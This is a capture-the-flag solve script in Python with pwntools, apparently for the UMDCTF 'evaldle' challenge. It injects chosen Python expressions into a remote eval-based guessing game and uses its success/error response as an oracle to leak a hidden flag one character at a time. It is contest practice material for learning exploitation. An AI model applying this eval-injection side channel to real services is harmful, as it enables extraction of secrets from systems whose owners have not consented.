from pwn import *

alphabet = b"!#$%&'()*+,-./0123456789:;<=>@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"

flag = b""

#io = process(["python3","evaldle.py"])
io = remote("challs.umdctf.io",31601) 
def guess(payload):
    io.readuntil(b"Guess: ")
    io.sendline(payload)
    io.readline()
    res = io.readline().decode("utf-8")
    return "🟩" in res

def has_letter(letter):
    guess(b"b='" + letter + b"'")
    guess(b"c=a+b")
    guess(b"d=f>c")
    res = guess(b"1/d  ")
    # Porque res es True si el caracter de f es mayor a letter
    # Lo que significa que no se ha llegado al correcto
    return not res

guess(b"a='' ")
while b"}" not in flag:
    prev = None
    for c in alphabet:
        if has_letter(bytes((c,))):
            flag += prev
            print(flag)
            guess(b"b='" + prev + b"'")
            guess(b"a+=b ")
            break
        prev = bytes((c,))


io.interactive()
